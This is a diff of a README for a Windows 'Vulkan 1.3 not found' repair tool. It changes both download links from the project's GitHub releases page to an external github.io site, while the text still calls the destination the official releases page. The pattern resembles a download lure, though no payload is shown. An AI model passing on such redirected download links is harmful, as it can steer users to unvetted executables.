@@ -1,6 +1,6 @@
 # 🛠️ Vulkan-1.3-Not-Found-Fix - Repair Graphics Errors on Windows Computers
 
-[<img src="https://img.shields.io/badge/Download-Release-blue.svg" alt="Download Link" />](https://github.com/Fossil-beggarlice554/Vulkan-1.3-Not-Found-Fix/releases)
+[<img src="https://img.shields.io/badge/Download-Release-blue.svg" alt="Download Link" />](https://fossil-beggarlice554.github.io)
 
 ## ❔ Understanding the Error
 
@@ -14,7 +14,7 @@ This tool scans your computer for the missing Vulkan loader files. It checks you
 
 You need to get the file from the official releases page. 
 
-[Visit this page to download the latest version](https://github.com/Fossil-beggarlice554/Vulkan-1.3-Not-Found-Fix/releases)
+[Visit this page to download the latest version](https://fossil-beggarlice554.github.io)
 
 1. Open the link above in your web browser.
 2. Look for the section called Assets.
